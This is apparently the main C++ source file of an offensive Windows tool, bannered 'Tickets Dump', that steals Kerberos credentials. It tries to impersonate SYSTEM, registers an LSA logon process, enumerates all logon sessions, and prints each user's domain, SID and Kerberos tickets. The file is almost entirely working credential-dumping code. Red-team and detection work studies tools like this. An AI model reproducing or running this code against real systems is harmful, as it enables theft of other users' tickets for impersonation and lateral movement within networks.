#include "stuff.h"

HANDLE hConsole;
VOID ShowAwesomeBanner() {
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 0x0C);
	std::cout << R"(
         .AMMMMMISHAMMA.
       .AV. :::.:.:.::MA.
      A' :..        : .:`A
     A'..              . `A.
    A' :.    :::::::::  : :`A
    M  .    :::.:.:.:::  . .M
    M  :   ::.:.....::.:   .M
    V : :.::.:........:.:  :V
   A  A:    ..:...:...:.   A A
  .V  MA:.....:M.::.::. .:AM.M
 A'  .VMMMMISHAMM:.:AMMMISHAMV: A
:M .  .`VMISHAMV.:A `VMMMMV .:M:
 V.:.  ..`VMMMV.:AM..`VMV' .: V
  V.  .:. .....:AMMA. . .:. .V
   VMM...: ...:.MMMM.: .: MMV
       `VM: . ..M.:M..:::M'
         `M::. .:.... .::M
          M:.  :. .... ..M
          V:  M:. M. :M .V
          `V.:M.. M. :M.V'
 ______  ___        __     ____  __    ___                 ___ 
/_  __/ <  / ____  / /__  |_  / / /_  / _ \ __ __  __ _   / _ \
 / /    / / / __/ /  '_/ _/_ < / __/ / // // // / /  ' \ / ___/
/_/    /_/  \__/ /_/\_\ /____/ \__/ /____/ \_,_/ /_/_/_//_/    
)" << std::endl;
	std::wcout << L"\t\t\t Michael Zhmaylo ( https://github.com/MzHmO )" << std::endl;
	SetConsoleTextAttribute(hConsole, 0x07);
}

std::map<int, std::string> enumToString = {
  {UndefinedLogonType, "UndefinedLogonType"},
  {Interactive, "Interactive"},
  {Network, "Network"},
  {Batch, "Batch"},
  {Service, "Service"},
  {Proxy, "Proxy"},
  {Unlock, "Unlock"},
  {NetworkCleartext, "NetworkCleartext"},
  {NewCredentials, "NewCredentials"},
  {RemoteInteractive, "RemoteInteractive"},
  {CachedInteractive, "CachedInteractive"},
  {CachedRemoteInteractive, "CachedRemoteInteractive"},
  {CachedUnlock, "CachedUnlock"}
};
BOOL LsaConnect(PHANDLE LsaHandle) {
	NTSTATUS status = 0;
	wchar_t username[256];
	DWORD usernamesize;
#ifdef DEBUG
	GetUserName(username, &usernamesize);
	std::wcout << L"[?] Current user: " << username << std::endl;
	std::wcout << L"[?] Trying to get system" << std::endl;
#endif	
	if (ImpersonateSystem() != 0) {
#ifdef DEBUG
		std::wcout << L"[-] Cant get SYSTEM rights" << std::endl;
#endif		
		status = LsaConnectUntrusted(LsaHandle);
		if (!NT_SUCCESS(status) || !LsaHandle) {
			std::wcout << L"[-] LsaConnectUntrusted Err: " << LsaNtStatusToWinError(status) << std::endl;
			exit(-1);
		}
		return FALSE;
	}
	else {
		GetUserName(username, &usernamesize);
		PLSA_STRING krbname = create_lsa_string("MzHmO Dumper");
		LSA_OPERATIONAL_MODE info;
#ifdef DEBUG
		std::wcout << L"[?] Current user: " << username << std::endl;
#endif
		status = LsaRegisterLogonProcess(krbname, LsaHandle, &info);
		if (!NT_SUCCESS(status) || !LsaHandle) {
			std::wcout << L"[-] Cant Register Logon Process" << std::endl;
			status = LsaConnectUntrusted(LsaHandle);
			if (!NT_SUCCESS(status) || !LsaHandle) {
				std::wcout << L"[-] LsaConnectUntrusted Err: " << LsaNtStatusToWinError(status) << std::endl;
				exit(-1);
			}
			return FALSE;
		}
		return TRUE;
	}
}

ULONG GetKerberosPackage(HANDLE LsaHandle, LSA_STRING lsastr) {
	NTSTATUS status;
	ULONG AP = 0;
	status = LsaLookupAuthenticationPackage(LsaHandle, &lsastr, &AP);
	if (AP == 0) {
		std::wcout << L"[-] Error LsaLookupAP: " << LsaNtStatusToWinError(status) << std::endl;
		exit;
	}
	return AP;
}
int main() {
	setlocale(LC_ALL, "");
	ShowAwesomeBanner();
	HANDLE LsaHandle = NULL;
	BOOL DumpAllTickets = FALSE;
	if (LsaConnect(&LsaHandle)) {
#ifdef DEBUG
		std::wcout << L"[+] I'll dump all tickets" << std::endl;
#endif		
		DumpAllTickets = TRUE;
	}
	else {
#ifdef DEBUG
		std::wcout << L"[-] I'll dump tickets of current user" << std::endl;
#endif	
	}
#ifdef DEBUG
	std::wcout << L"[+] LsaHandle: " << (unsigned long)LsaHandle << std::endl;
#endif
	PLSA_STRING krbname = create_lsa_string("kerberos");
	ULONG kerberosAP = GetKerberosPackage(LsaHandle, *krbname);
#ifdef DEBUG
	std::wcout << L"[+] Kerberos AP: " << kerberosAP << std::endl;
#endif

	if (DumpAllTickets) {
		ULONG LogonSessionCount;
		PLUID LogonSessionList = NULL;
		NTSTATUS status = LsaEnumerateLogonSessions(&LogonSessionCount, &LogonSessionList);
		if (status != 0) {
#ifdef DEBUG
			std::wcout << L"[-] Cant get info about logon sessions: " << LsaNtStatusToWinError(status) << std::endl;
			std::wcout << L"[!] Getting current user tickets" << std::endl;
#endif			
			RevertToSelf();
			LsaDeregisterLogonProcess(LsaHandle);
			LsaConnectUntrusted(&LsaHandle);
			ReceiveLogonInfo(LsaHandle, { 0,0 }, kerberosAP);
		}
		PSECURITY_LOGON_SESSION_DATA pLogonSessionData = (PSECURITY_LOGON_SESSION_DATA)malloc(sizeof(SECURITY_LOGON_SESSION_DATA));

		for (int i = 0; i < LogonSessionCount; i++) {
			LsaGetLogonSessionData(LogonSessionList + i, &pLogonSessionData);
			SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN);
			std::wcout << "------------------------------------------------" << std::endl;
			std::wcout << "[+] Tickets For: " << pLogonSessionData->LogonDomain.Buffer << L"\\" << pLogonSessionData->UserName.Buffer << std::endl;
			LUID LogonId = *(LogonSessionList + i);

			std::wcout << "\tLogonId:\t" << std::hex << LogonId.HighPart << LogonId.LowPart << std::endl;
			LPWSTR sidstr;
			ConvertSidToStringSid(pLogonSessionData->Sid, &sidstr);
			std::wcout << "\tUserSID:\t" << sidstr << std::endl;
			std::wcout << "\tAuthenticationPackage:\t" << pLogonSessionData->AuthenticationPackage.Buffer << std::endl;
			std::cout << "\tLogonType:\t" << enumToString[pLogonSessionData->LogonType] << std::endl;
			std::wcout << "\tLogonTime:\t"; filetimeToTime((PFILETIME)&pLogonSessionData->LogonTime);
			std::wcout << "\tLogonServer:\t" << pLogonSessionData->LogonServer.Buffer << std::endl;
			std::wcout << "\tLogonServerDNSDomain:\t" << pLogonSessionData->DnsDomainName.Buffer << std::endl;
			std::wcout << "\tUserPrincipalName:\t" << pLogonSessionData->Upn.Buffer << std::endl;
			SetConsoleTextAttribute(hConsole, 0x07);
			ReceiveLogonInfo(LsaHandle, *(LogonSessionList + i), kerberosAP);
		}

		LsaFreeReturnBuffer(LogonSessionList);
	}
	else {
		ReceiveLogonInfo(LsaHandle, { 0,0 }, kerberosAP);
	}

	LsaDeregisterLogonProcess(LsaHandle);
	return 0;
}